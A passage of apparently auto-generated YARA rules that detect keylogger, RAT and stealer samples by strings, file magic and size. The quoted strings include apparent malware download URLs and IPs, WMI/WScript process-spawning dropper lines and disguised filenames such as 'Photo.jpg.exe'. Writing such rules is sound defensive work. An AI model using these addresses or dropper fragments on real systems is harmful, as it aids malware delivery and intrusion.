      $s5 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s6 = "oJI.pdb" fullword ascii /* score: '11.00'*/
      $s7 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s9 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s10 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s11 = "UPlq/- " fullword ascii /* score: '8.00'*/
      $s12 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__79f29e19 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_79f29e19.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "79f29e19a0a27f7619fd475614f372433b26c95e9f8c11c1622ec9cc3c16eca5"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "csg.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "csg.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "Agdi.sef" fullword ascii /* score: '10.00'*/
      $s9 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s10 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s11 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ba8cc276 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ba8cc276.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ba8cc276a98e4822f672e7655d88829ce6b243cbf01e31cc4eb6c28544a9b86b"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "FXP.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "FXP.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s9 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s10 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__02008697 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_02008697.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "020086975001e27c95565f8040b7e637fbee03497b950f8c0cae4ed7a3d1074f"
   strings:
      $s1 = "Owlvvomexbz.exe" fullword wide /* score: '22.00'*/
      $s2 = "ReportReadableLogger" fullword ascii /* score: '20.00'*/
      $s3 = "LogOperationalLogger" fullword ascii /* score: '19.00'*/
      $s4 = "ProcessPassiveEnumerator" fullword ascii /* score: '18.00'*/
      $s5 = "m_TokenizerLoggers" fullword ascii /* score: '17.00'*/
      $s6 = "ReportVirtualLogger" fullword ascii /* score: '17.00'*/
      $s7 = "_PassiveLoggerData" fullword ascii /* score: '17.00'*/
      $s8 = "WaitForCommonLogger" fullword ascii /* score: '17.00'*/
      $s9 = "WaitForRemoteLogger" fullword ascii /* score: '17.00'*/
      $s10 = "ReportControllableLogger" fullword ascii /* score: '17.00'*/
      $s11 = "LogCombinedLogger" fullword ascii /* score: '17.00'*/
      $s12 = "loggerUserElements" fullword ascii /* score: '17.00'*/
      $s13 = "HOwlvvomexbz, Version=1.0.6354.6545, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s14 = "Owlvvomexbz.Logging" fullword ascii /* score: '16.00'*/
      $s15 = "m_IsCreatorProcessor" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48c8318860e4ad8eaabaa740dedf267da5a6ae2d032c61be0a9df62dabe1c607"
   strings:
      $s1 = "Oaaireskw.exe" fullword wide /* score: '22.00'*/
      $s2 = "injectconfig" fullword ascii /* score: '21.00'*/
      $s3 = "EncryptorRunner" fullword ascii /* score: '17.00'*/
      $s4 = "GOaaireskw, Version=1.0.3618.27720, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "adjustableExecutor" fullword ascii /* score: '16.00'*/
      $s6 = "InterruptibleEncryptor" fullword ascii /* score: '14.00'*/
      $s7 = "m_EncryptorTesterLimit" fullword ascii /* score: '14.00'*/
      $s8 = "_EncryptorDictionaryLength" fullword ascii /* score: '14.00'*/
      $s9 = "m_EncryptorArgumentInterval" fullword ascii /* score: '14.00'*/
      $s10 = "procEncryptor" fullword ascii /* score: '14.00'*/
      $s11 = "AssignAdjustableCommand" fullword ascii /* score: '12.00'*/
      $s12 = "m_ContainerCommandArray" fullword ascii /* score: '12.00'*/
      $s13 = "SeparatedDecryptor" fullword ascii /* score: '11.00'*/
      $s14 = "_DictionaryDecryptorIdx" fullword ascii /* score: '11.00'*/
      $s15 = "versionpol" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7914b50d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7914b50d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7914b50d3cb4dfdbb2cc92b4b833d2e87416c39fb81f8979297a989f9b9c4bed"
   strings:
      $s1 = "aCT.exe" fullword wide /* score: '19.00'*/
      $s2 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s3 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s4 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s5 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s6 = "aCT.pdb" fullword ascii /* score: '11.00'*/
      $s7 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s8 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s9 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s10 = "get_SpellCheckEnabled" fullword ascii /* score: '9.00'*/
      $s11 = "<GetStatistics>b__36_0" fullword ascii /* score: '9.00'*/
      $s12 = "get_Winken_nach_Rechts" fullword ascii /* score: '9.00'*/
      $s13 = "get_TotalWords" fullword ascii /* score: '9.00'*/
      $s14 = "<GetDeletedNotes>b__11_1" fullword ascii /* score: '9.00'*/
      $s15 = "get_TagsCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__31a41ec3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_31a41ec3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31a41ec300e4c59521f0e3dd55191a602e20594eeac4c6c7d3c7022a90691cd2"
   strings:
      $s1 = "Nqztwc.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://primeline.it.com/pure/Wtcybqn.vdf" fullword wide /* score: '17.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "{7f8706e4-3f20-43d3-9398-ae3da170c3fc}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s5 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s6 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s7 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s8 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s9 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s10 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6ce93fb7 {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6ce93fb7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6ce93fb7bef42cf3ac7f4f67a150e96093022fb7592e63cb087b352ade9febbb"
   strings:
      $s1 = "Rtmtp.exe" fullword wide /* score: '22.00'*/
      $s2 = "CRtmtp, Version=1.0.6664.27540, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s5 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s8 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s9 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "get_Nndaovmhq" fullword ascii /* score: '9.00'*/
      $s12 = "* 4&BD`" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s14 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s15 = "dOgw+ j" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule RemcosRAT_signature__7fe73890 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_7fe73890.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7fe73890d1d759d4787546b61a296d3ad97d72ce95e5cc60f4c67fc68b371ed4"
   strings:
      $s1 = "var seriphidium = subnationally.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var sliverer = subnationally.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var farinaceously = ambiversions.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '22.00'*/
      $s4 = "var ambiversions = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '13.00'*/
      $s5 = "var subnationally = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var figurately = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s7 = "g(\\'' + piecrusts + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "expromissor = expromissor + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__87fcbd1f {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_87fcbd1f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87fcbd1f67359062e18c02f3a27bc8e192cf771819fd929cc8a96d884cf35f5f"
   strings:
      $s1 = "var archdevil = concionatory.Get(\"Win32_Process\");" fullword ascii /* score: '28.00'*/
      $s2 = "var adats = concionatory.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s3 = "var matchlockman = infantine.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var concionatory = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var congrogadus = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var infantine = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "var ephemerist = archdevil.Create(Offaly, matchlockman, adats, congrogadus);" fullword ascii /* score: '9.00'*/
      $s8 = "Offaly = Offaly + '" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + Debrecen + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__8d2eb5b6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8d2eb5b6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d2eb5b60fb361710d037ecad9395553bd1bfe06eda18c71c6fdd0317b0601d9"
   strings:
      $s1 = "var gallinule = myrmecobe.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var wizened = myrmecobe.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var ganglionless = mooches.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var myrmecobe = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var brewing = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var mooches = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + uncondemned + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "Octobr = Octobr + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__cfa5264d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_cfa5264d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cfa5264d2592a1fe11fed0d39d463cd1303eb428506125cb6c180a0e4c20caf0"
   strings:
      $s1 = "var concertist = intussusceptive.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var prebendry = intussusceptive.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var ductility = skippered.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var intussusceptive = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var Molise = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var skippered = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "likehood = likehood + '" fullword ascii /* score: '8.00'*/
      $s8 = "g(\\'' + mellate + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__e8caf4ce {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_e8caf4ce.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e8caf4ceab4313b405809447608a3a14e0fb99600404646b9f615b15ca8d5fcc"
   strings:
      $s1 = "var wauff = associatory.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s2 = "var electroreplica = associatory.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '22.00'*/
      $s3 = "var bombe = trendinesses.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var glaive = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var associatory = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var trendinesses = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "murrelet = murrelet + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule Rhadamanthys_signature__19b9356b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_19b9356b.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "19b9356b882b9c8b4bb04ecce04627e70cde9eaabcd8cd8ee679af0c8d31aaec"
   strings:
      $s1 = "    script.src = \"https:\\/\\/scbfile.com\\/common\\/preload.php?a=1&t=\"+ts+'&lkt=3&r='+(dref)+(l_val ? '&l_val=1' : '')+'&dat" ascii /* score: '29.00'*/
      $s2 = "    script.src = \"https:\\/\\/scbfile.com\\/common\\/preload.php?a=1&t=\"+ts+'&lkt=3&r='+(dref)+(l_val ? '&l_val=1' : '')+'&dat" ascii /* score: '24.00'*/
      $s3 = "<script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js\"></script>" fullword ascii /* score: '23.00'*/
      $s4 = "<script type=\"text/javascript\" src=\"https://scbfile.com/jquery.tipsy.js\"></script>" fullword ascii /* score: '23.00'*/
      $s5 = "Permission is granted to temporarily download one copy of the materials (information or software) on this site for personal, non" ascii /* score: '22.00'*/
      $s6 = "Permission is granted to temporarily download one copy of the materials (information or software) on this site for personal, non" ascii /* score: '22.00'*/
      $s7 = "if (target_url.search('tracking_id') == -1 && tracking_id != '' && tracking_id != null) {" fullword ascii /* score: '21.00'*/
      $s8 = "img.src = \"https://scbfile.com/common/dom_update.php?t=1756155608&lid=1788618\"+'&flags='+flags+'&intv='+setcheckintval;" fullword ascii /* score: '20.00'*/
      $s9 = "console.log( e );" fullword ascii /* score: '19.00'*/
      $s10 = "var decoded = hex_decode(encoded);" fullword ascii /* score: '18.00'*/
      $s11 = "70686e41414141" ascii /* score: '17.00'*/ /* hex encoded string 'phnAAAA' */
      $s12 = "url: \"https://scbfile.com/common/ajax_check_url.php\"," fullword ascii /* score: '17.00'*/
      $s13 = "<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>" fullword ascii /* score: '17.00'*/
      $s14 = "<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css\" integrity=\"sha512-K" ascii /* score: '17.00'*/
      $s15 = "var target_url = item.url;" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 90KB and
      8 of them
}

rule RustyStealer_signature__e5a7688a7a1246c8f803d1495445341d_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_e5a7688a7a1246c8f803d1495445341d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d5e20fc37dd77dd0360fd32446799978048a2c60e036dbfbf5e671333ebd81f1"
   strings:
      $s1 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s2 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s3 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\raw_vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s4 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\exact_size.rs" fullword ascii /* score: '24.00'*/
      $s5 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\char\\methods.rs" fullword ascii /* score: '24.00'*/
      $s6 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\iterator.rs" fullword ascii /* score: '24.00'*/
      $s7 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '24.00'*/
      $s8 = "internal error: entered unreachable codeC:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\error\\re" ascii /* score: '24.00'*/
      $s9 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\string.rs" fullword ascii /* score: '24.00'*/
      $s10 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\sync\\atomic.rs" fullword ascii /* score: '24.00'*/
      $s11 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\ffi\\c_str.rs" fullword ascii /* score: '24.00'*/
      $s12 = "internal error: entered unreachable codeC:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\error\\re" ascii /* score: '24.00'*/
      $s13 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s14 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\slice\\memchr.rs" fullword ascii /* score: '24.00'*/
      $s15 = "assertion failed: self.is_char_boundary(new_len)C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\str" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RustyStealer_signature__e13e81e2770dde23350136d77ccd510f_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_e13e81e2770dde23350136d77ccd510f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24ee0bdb2692d45c41c7f6b8cfd47e31546c8d04278e23463bf0a8629a99137f"
   strings:
      $s1 = "http://178.16.53.7//bot.exe" fullword wide /* score: '27.00'*/
      $s2 = "http://178.16.53.7/DD.exe" fullword wide /* score: '27.00'*/
      $s3 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s4 = "Document.pdf.exe" fullword wide /* score: '22.00'*/
      $s5 = "Photo.jpg.exe" fullword wide /* score: '22.00'*/
      $s6 = "icon=shell32.dll,4" fullword ascii /* score: '21.00'*/
      $s7 = "open=Update.exe" fullword ascii /* score: '19.00'*/
      $s8 = "DfIl%d.exe" fullword wide /* score: '19.00'*/
      $s9 = "\\AppData\\Roaming\\" fullword wide /* score: '15.00'*/
      $s10 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s11 = "\\Temporary Internet Files\\" fullword wide /* score: '12.00'*/
      $s12 = "Documents Backup.lnk" fullword wide /* score: '11.00'*/
      $s13 = "\\AppData\\LocalLow\\" fullword wide /* score: '11.00'*/
      $s14 = "Double-click to view contents" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule ValleyRAT_signature__d607b6016ada8a0c4e36ad1a81373ee4_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_d607b6016ada8a0c4e36ad1a81373ee4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b5a4aca8b7ebc7955918ae9ac4f152b585158712970f3bc681ab2a5c53778ca"
   strings:
      $x1 = "C:\\Users\\Public\\Pictures\\WindowsData\\bypass.exe" fullword wide /* score: '46.00'*/
      $x2 = "C:\\Users\\Public\\Documents\\WindowsData\\NVIDIA.exe" fullword ascii /* score: '38.00'*/
      $x3 = "C:\\Users\\Public\\Pictures\\WindowsData\\NVIDIA.exe" fullword wide /* score: '38.00'*/
      $x4 = "C:\\Users\\Public\\Pictures\\WindowsData\\main.exe 2" fullword ascii /* score: '34.00'*/
      $x5 = "C:\\Users\\Public\\Pictures\\WindowsData\\main.exe 1" fullword ascii /* score: '34.00'*/
      $x6 = "C:\\Users\\Public\\Pictures\\WindowsData\\NtHandleCallback.exe" fullword ascii /* score: '34.00'*/
      $x7 = "C:\\Users\\Public\\Pictures\\WindowsData\\windows.log" fullword wide /* score: '34.00'*/
      $s8 = "wdc.dll" fullword ascii /* reversed goodware string 'lld.cdw' */ /* score: '30.00'*/
      $s9 = "C:\\Users\\Public\\Pictures\\WindowsData\\X.vbe" fullword wide /* score: '30.00'*/
      $s10 = "C:/Users/Public/Pictures/WindowsData/tree.exe" fullword wide /* score: '30.00'*/
      $s11 = "C:/Users/Public/Pictures/WindowsData/kail.exe" fullword wide /* score: '30.00'*/
      $s12 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '28.00'*/
      $s13 = "C:/Users/Public/Pictures/WindowsData/NtHandleCallback.exe" fullword wide /* score: '26.00'*/
      $s14 = "bypass.exeSDg" fullword ascii /* score: '22.00'*/
      $s15 = "bypass.exeSD" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule SparkRAT_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file SparkRAT(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fca567acf226af9195057fc6d1b7879462a84347bbec8bb66a7d83a77842a15"
   strings:
      $s1 = "MNOPQR" fullword ascii /* reversed goodware string 'RQPONM' */ /* score: '13.50'*/
      $s2 = "DuMPe8" fullword ascii /* score: '12.00'*/
      $s3 = "xeXeCOK" fullword ascii /* score: '12.00'*/
      $s4 = "vKTMA\\EXEC" fullword ascii /* score: '12.00'*/
      $s5 = "333333i" fullword ascii /* reversed goodware string 'i333333' */ /* score: '11.00'*/
      $s6 = "TYDD.saG" fullword ascii /* score: '10.00'*/
      $s7 = "ilrz.ije" fullword ascii /* score: '10.00'*/
      $s8 = "\\4?%/8 ." fullword ascii /* score: '10.00'*/ /* hex encoded string 'H' */
      $s9 = "fromftps0" fullword ascii /* score: '10.00'*/
      $s10 = "lognet" fullword ascii /* score: '10.00'*/
      $s11 = "%/41/2;-+-!4*" fullword ascii /* score: '9.00'*/ /* hex encoded string 'A$' */
      $s12 = "5%6*:%=%>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
      $s13 = "2!0-3&023" fullword ascii /* score: '9.00'*/ /* hex encoded string ' 0#' */
      $s14 = "ftPob8(d" fullword ascii /* score: '9.00'*/
      $s15 = "a$>HostINISII" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      8 of them
}

rule Rhadamanthys_signature__11b5e5a8c80fad621ae3668e21759e30_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_11b5e5a8c80fad621ae3668e21759e30(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f2fe165104b2b9de2fde5c8cbeb05dc07cdc832dcb82c9849e0eff843a5cb29"
   strings:
      $s1 = "# K-.N_TG y~.K X\\.UZD].E q D.l.P.1iTyu ofSsU{ C z.4.v.t- U_I_g.7: t_jv.l e.V_L t z F S b.JUjC " fullword ascii /* score: '15.00'*/
      $s2 = "A.g+u.6*.L_CZiT.Sj g Tk.zH1=),.C_G i+;y.F_c* k_kU Sl Q z2_M.Ne.FCl.Fh v_r.l" fullword ascii /* score: '11.00'*/
      $s3 = "]:_V_G_t.x.v zX* R.s.K| L.izz.UWC_l_y_Gv7.U y_H_f.c} C_L DF$.P w_sumK A T.T.r.W.C.E_n.y" fullword ascii /* score: '11.00'*/
      $s4 = "eh_p=.V F.ke.j#_i\\.mdE.w_TV_mNNL Y.2_yu g?.6 f b_J.D.P gV+ E.R i W,>_U>N) d.mC dE7" fullword ascii /* score: '11.00'*/
      $s5 = "XP+_T.Gs!7_D_t C.a c L>.0~ r.Y_v.a.S.Hi_D.b PU_XZDX/$[%I_A.P_mew T l j.r H* w b.Z.P B_W_T " fullword ascii /* score: '11.00'*/
      $s6 = "$NM.i%.I.U1.h B z_g.G_H.kvq.Q_W h:} VE u qV+ Iff G Af em_HEEv&_x_b@c.A9_G v.X1-.V h.0_j.T_f_h" fullword ascii /* score: '11.00'*/
      $s7 = "P n Q p k Q vU i3D.s_uw.AC@o+ S{ YR8D G_VQMQ.G_l L?L_Tc_o u.C_qTX.g.iU.Vuu.s" fullword ascii /* score: '11.00'*/
